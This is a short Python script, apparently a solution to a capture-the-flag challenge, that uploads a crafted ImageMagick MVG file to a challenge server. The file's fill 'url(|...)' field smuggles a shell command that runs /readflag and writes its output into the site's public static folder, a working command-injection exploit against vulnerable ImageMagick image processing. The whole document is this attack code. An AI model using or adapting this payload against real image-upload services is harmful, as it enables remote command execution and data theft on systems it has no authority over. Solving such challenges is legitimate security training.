import requests
payload = """push graphic-context
viewbox 0 0 640 480
fill 'url(|/readflag >/app/static/flag.txt)'
rectangle 0,0 640 480
pop graphic-context"""
files = {'img': ('payload.mvg', payload, 'image/x-mvg')}
data = {'name': 'test'}
resp = requests.post('https://aa1fadfd635d-magik.challs.m0lecon.it', files=files, data=data, timeout=10)
print('upload status', resp.status_code)
